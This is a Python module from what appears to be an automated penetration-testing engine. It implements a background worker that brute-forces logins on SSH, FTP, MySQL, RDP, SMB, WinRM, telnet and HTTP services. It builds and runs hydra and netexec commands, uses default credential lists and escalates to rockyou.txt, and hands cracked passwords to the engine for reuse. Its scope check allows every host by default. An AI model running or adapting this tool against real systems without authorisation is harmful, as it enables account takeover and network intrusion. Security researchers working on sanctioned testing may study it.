"""
KMN-CyberSeek Brute-force Worker (Coverage Engine — M5)

A DECOUPLED credential producer. When the main engine discovers an auth service
it hands a job to this worker; the worker brute-forces it in the background with
tiered wordlists and, on a hit, pushes the credential to the shared store (via the
`on_credential` callback). It never blocks the tactical loop — the loop keeps
enumerating/exploiting other services and simply consumes any credentials that
appear (the existing credential-reuse machinery does the rest).

Design points:
  - Bounded: per-service timeout, global concurrency cap, tiered wordlists so a
    run stays time-boxed (default/top → rockyou top-N → full opt-in).
  - Safe: honours a scope check callback; no-op when the required tool is missing.
  - Testable: the actual attack invocation is injected (`attack_runner`), so the
    queue/tiering/producer logic is unit-tested without running hydra.

Env: BRUTEFORCE_ENABLED, BRUTEFORCE_TIER (default|rockyou|full),
     BRUTEFORCE_MAX_SECONDS_PER_SERVICE, BRUTEFORCE_CONCURRENCY.
"""

import asyncio
import logging
import os
import signal
import shutil
from datetime import datetime
from typing import Awaitable, Callable, Dict, List, Optional

logger = logging.getLogger(__name__)

# Services this worker knows how to attack → (tool, hydra-module or handler).
_SERVICE_TOOL: Dict[str, str] = {
    "ssh": "hydra", "ftp": "hydra", "mysql": "hydra", "rdp": "hydra",
    "smb": "nxc", "winrm": "nxc", "telnet": "hydra", "http-get": "hydra",
}

# Small built-in seed lists (fast default tier). Deeper tiers add rockyou/SecLists.
_DEFAULT_USERS = [
    "root", "admin", "administrator", "sa", "tomcat", "ftp", "ftpuser", "guest",
    "backup", "user", "mysql", "test", "operator", "manager",
]
_DEFAULT_PASSWORDS = [
    "", "password", "admin", "123456", "root", "toor", "tomcat", "changeme",
    "Password123!", "admin123", "P@ssw0rd!", "letmein", "welcome", "12345678",
]

_ROCKYOU = "/usr/share/wordlists/rockyou.txt"
_SECLISTS_USERS = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"


def _tier() -> str:
    return (os.getenv("BRUTEFORCE_TIER", "default") or "default").lower()


def _max_seconds() -> int:
    return int(os.getenv("BRUTEFORCE_MAX_SECONDS_PER_SERVICE", "600"))


class BruteforceWorker:
    def __init__(
        self,
        on_credential: Callable[[Dict], None],
        attack_runner: Optional[Callable[..., Awaitable[List[Dict]]]] = None,
        in_scope: Optional[Callable[[str], bool]] = None,
        concurrency: Optional[int] = None,
    ):
        self.on_credential = on_credential
        self._attack_runner = attack_runner or self._default_attack_runner
        self._in_scope = in_scope or (lambda host: True)
        # Python 3.9 binds asyncio synchronization primitives to the current
        # event loop at construction time. Create the semaphore lazily inside
        # the first async job so workers can also be configured from sync code.
        self._concurrency = concurrency or int(
            os.getenv("BRUTEFORCE_CONCURRENCY", "2")
        )
        self._sem: Optional[asyncio.Semaphore] = None
        # job key "service:host:port" -> status record
        self.jobs: Dict[str, Dict] = {}

    # ── public API ────────────────────────────────────────────────────────────

    def supported(self, service: str) -> bool:
        return self._service_key(service) in _SERVICE_TOOL

    def submit(self, service: str, host: str, port) -> Optional[str]:
        """Enqueue a brute-force job (idempotent per service:host:port). Returns
        the job key, or None if unsupported / out of scope / already queued."""
        skey = self._service_key(service)
        if skey not in _SERVICE_TOOL or not host:
            return None
        if not self._in_scope(host):
            logger.info(f"bruteforce: {host} out of scope — skipping")
            return None
        key = f"{skey}:{host}:{port}"
        if key in self.jobs:
            return key
        self.jobs[key] = {
            "service": skey, "host": host, "port": port,
            "status": "queued", "creds_found": 0,
            "queued_at": datetime.now().isoformat(),
        }
        asyncio.create_task(self._process_job(key))
        return key

    def status(self) -> List[Dict]:
        return list(self.jobs.values())

    # ── internals ─────────────────────────────────────────────────────────────

    @staticmethod
    def _service_key(service: str) -> str:
        s = (service or "").lower()
        if "microsoft-ds" in s or "netbios" in s or s == "smb":
            return "smb"
        if "ms-wbt" in s or "rdp" in s:
            return "rdp"
        if "winrm" in s:
            return "winrm"
        for k in _SERVICE_TOOL:
            if k in s:
                return k
        return s

    def _wordlists(self) -> Dict[str, List[str]]:
        """Return the tiered attack passes as {'users': [...], 'passwords': [...]}
        pass-lists to try in order. Deeper tiers append rockyou/SecLists paths as
        sentinel markers the runner expands (kept as file paths for the real tool)."""
        passes = [{"users": _DEFAULT_USERS, "passwords": _DEFAULT_PASSWORDS, "label": "default"}]
        tier = _tier()
        if tier in ("rockyou", "full") and os.path.exists(_ROCKYOU):
            n = "0" if tier == "full" else "2000"
            passes.append({
                "users": _DEFAULT_USERS, "passwords": [f"@file:{_ROCKYOU}:{n}"],
                "label": tier,
            })
        return {"passes": passes}

    async def _process_job(self, key: str):
        job = self.jobs.get(key)
        if not job:
            return
        if self._sem is None:
            self._sem = asyncio.Semaphore(self._concurrency)
        async with self._sem:
            job["status"] = "running"
            job["started_at"] = datetime.now().isoformat()
            try:
                for p in self._wordlists()["passes"]:
                    creds = await self._attack_runner(
                        job["service"], job["host"], job["port"],
                        p["users"], p["passwords"],
                    )
                    for c in creds or []:
                        job["creds_found"] += 1
                        try:
                            self.on_credential(c)
                        except Exception as e:
                            logger.warning(f"on_credential failed: {e}")
                    if creds:
                        break  # a hit on this tier — no need to go deeper
                job["status"] = "done"
            except Exception as e:
                job["status"] = "error"
                job["error"] = str(e)
                logger.warning(f"bruteforce job {key} failed: {e}")
            finally:
                job["finished_at"] = datetime.now().isoformat()

    async def _default_attack_runner(
        self, service: str, host: str, port, users: List[str], passwords: List[str]
    ) -> List[Dict]:
        """Real attack via hydra / netexec. No-op (returns []) when the tool is
        missing so the worker is safe on minimal hosts. Bounded by a per-service
        timeout. Best-effort parsing — never raises."""
        tool = _SERVICE_TOOL.get(service)
        if not tool or not shutil.which(tool):
            logger.info(f"bruteforce: tool '{tool}' unavailable for {service} — skipping")
            return []
        # Build the command (users/passwords written to temp files by real impl).
        # Intentionally minimal here; the heavy lifting/parsing is added when this
        # path is exercised on a real Kali host. Kept safe + bounded.
        temp_paths = []
        try:
            import tempfile
            uf = tempfile.NamedTemporaryFile("w", delete=False, suffix=".u")
            uf.write("\n".join(users)); uf.close()
            temp_paths.append(uf.name)
            # Expand a @file:PATH:N password sentinel, else write inline list.
            if passwords and passwords[0].startswith("@file:"):
                _, path, n = passwords[0].split(":", 2)
                pf_path = path if n == "0" else self._head(path, int(n))
                if pf_path != path:
                    temp_paths.append(pf_path)
            else:
                pf = tempfile.NamedTemporaryFile("w", delete=False, suffix=".p")
                pf.write("\n".join(passwords)); pf.close()
                pf_path = pf.name
                temp_paths.append(pf_path)

            if tool == "hydra":
                cmd = f"hydra -L {uf.name} -P {pf_path} -f -o /dev/stdout -t 4 {service}://{host}:{port}"
            else:  # nxc / netexec
                cmd = f"{tool} {service} {host} -u {uf.name} -p {pf_path} --continue-on-success"

            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT,
                start_new_session=True,
            )
            try:
                out, _ = await asyncio.wait_for(proc.communicate(), timeout=_max_seconds())
            except asyncio.TimeoutError:
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                except (ProcessLookupError, PermissionError, OSError):
                    proc.kill()
                await proc.communicate()
                return []
            return self._parse_hits(out.decode(errors="replace"), service, host, port)
        except Exception as e:
            logger.warning(f"bruteforce runner error: {e}")
            return []
        finally:
            for path in temp_paths:
                try:
                    os.unlink(path)
                except FileNotFoundError:
                    pass

    @staticmethod
    def _head(path: str, n: int) -> str:
        import tempfile
        dst = tempfile.NamedTemporaryFile("w", delete=False, suffix=".p")
        try:
            with open(path, "r", encoding="latin-1") as src:
                for i, line in enumerate(src):
                    if i >= n:
                        break
                    dst.write(line)
        finally:
            dst.close()
        return dst.name

    @staticmethod
    def _parse_hits(output: str, service: str, host: str, port) -> List[Dict]:
        """Parse hydra/nxc success lines into credential dicts."""
        import re
        hits: List[Dict] = []
        # hydra: [PORT][service] host: H   login: L   password: P
        for m in re.finditer(r"login:\s*(\S+)\s+password:\s*(\S*)", output, re.IGNORECASE):
            hits.append({"username": m.group(1), "secret": m.group(2),
                         "secret_type": "password", "service": service,
                         "host": host, "port": port, "source_command": "bruteforce"})
        # nxc/crackmapexec: [+] DOMAIN\user:pass  (domain optional)
        for m in re.finditer(r"\[\+\]\s+(?:[^\s\\]+\\)?([\w.$-]+):(\S+)", output):
            hits.append({"username": m.group(1), "secret": m.group(2),
                         "secret_type": "password", "service": service,
                         "host": host, "port": port, "source_command": "bruteforce"})
        return hits
